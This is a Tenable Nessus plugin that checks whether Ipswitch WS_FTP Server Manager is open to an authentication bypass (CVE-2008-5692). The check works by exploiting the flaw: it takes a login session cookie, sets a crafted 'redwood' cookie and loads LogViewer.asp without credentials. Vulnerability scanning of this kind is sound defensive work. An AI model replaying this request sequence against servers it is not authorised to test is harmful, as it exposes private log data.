#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(30208);
  script_version("$Revision: 1.15 $");

  script_cve_id("CVE-2008-5692");
  script_bugtraq_id(27654);
  script_osvdb_id(42046);
  script_xref(name:"Secunia", value:"28822");

  script_name(english:"Ipswitch WS_FTP Server Manager /WSFTPSVR/FTPLogServer/LogViewer.asp Authentication Bypass");
  script_summary(english:"Tries to view logs");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by an authentication bypass
vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host is running WS_FTP Server Manager, also known as WS_FTP
WebService, a web-based administration tool included, for example,
with Ipswitch WS_FTP Server. 

The version of WS_FTP Server Manager installed on the remote host
allows an attacker by bypass authentication and gain access to ASP
scripts in the '/WSFTPSVR/FTPLogServer' folder by first calling the
login script to obtain a session cookie.  By leveraging this issue, an
attacker can view log entries collected by the Logger Server, which
may contain sensitive information.  The attacker can not, though, 
otherwise gain administrative control of the affected application." );
 script_set_attribute(attribute:"see_also", value:"http://aluigi.altervista.org/adv/wsftpweblog-adv.txt" );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2008/Feb/56" );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2008/Feb/67" );
 script_set_attribute(attribute:"see_also", value:"http://docs.ipswitch.com/WS_FTP_Server611/ReleaseNotes/index.htm" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to WS_FTP Server Manager 6.1.1 or later." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(287);
 script_set_attribute(attribute:"plugin_publication_date", value: "2008/02/08");
 script_cvs_date("$Date: 2016/10/27 15:03:54 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe",value:"cpe:/a:ipswitch:ws_ftp");
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");
  script_copyright(english:"This script is Copyright (C) 2008-2016 Tenable Network Security, Inc.");
  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);

# Make sure the banner is from Ipswitch.
banner = get_http_banner(port:port);
if (
  !banner ||
  "Server: Ipswitch" >!< banner
) exit(0);

init_cookiejar();
r = http_send_recv3(method: "GET", item:"/WSFTPSVR/FTPLogServer/login.asp", port:port);
if (isnull(r)) exit(0);
val = get_http_cookie(name: "Ipswitch_WSFTP");
if (isnull(val)) exit(0);

if (isnull(get_http_cookie(name: "redwood")))
 set_http_cookie(name: "redwood", value: "sRoot=/WSFTPSVR");

# Now try to pull up the log viewing form.
r = http_send_recv3(method: "GET", item: "/WSFTPSVR/FTPLogServer/LogViewer.asp", port:port);
if (isnull(r)) exit(0);

# There's a problem if we are logged in.
if (
  'Logged in as: <b>localhostnull' >< r[2] &&
  'action="LogViewerDetails.asp"' >< r[2]
) security_warning(port);
